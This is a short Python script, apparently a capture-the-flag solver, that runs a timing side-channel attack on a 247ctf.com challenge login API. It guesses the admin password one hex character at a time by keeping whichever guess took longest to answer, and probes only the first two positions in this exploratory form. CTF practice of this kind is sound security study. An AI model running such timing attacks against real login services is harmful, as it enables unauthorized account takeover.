#!/usr/bin/env python3
import requests
import time

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    token = data["message"].split("reset to ")[1].rstrip("!")
    return token

def try_password(username, password, api_token):
    start = time.time()
    resp = requests.post(
        f"{BASE_URL}/api/login",
        data={
            "username": username,
            "password": password,
            "api": api_token
        },
        timeout=10
    )
    elapsed = time.time() - start
    return resp.json(), elapsed

# Probar dos rondas con diferentes tokens para las primeras 2 posiciones
for round_num in range(2):
    api_token = get_token()
    print(f"\n=== Ronda {round_num + 1}, Token: {api_token} ===")
    
    known = ""
    for pos in range(2):
        timings = {}
        
        for char in HEX_CHARS:
            test_password = known + char + "0" * (31 - len(known))
            result, elapsed = try_password("admin", test_password, api_token)
            timings[char] = elapsed
        
        best_char = max(timings.items(), key=lambda x: x[1])[0]
        known += best_char
        print(f"Posición {pos}: {best_char}")
    
    print(f"Contraseña parcial: {known}")
    
    # Pausa entre rondas
    time.sleep(2)
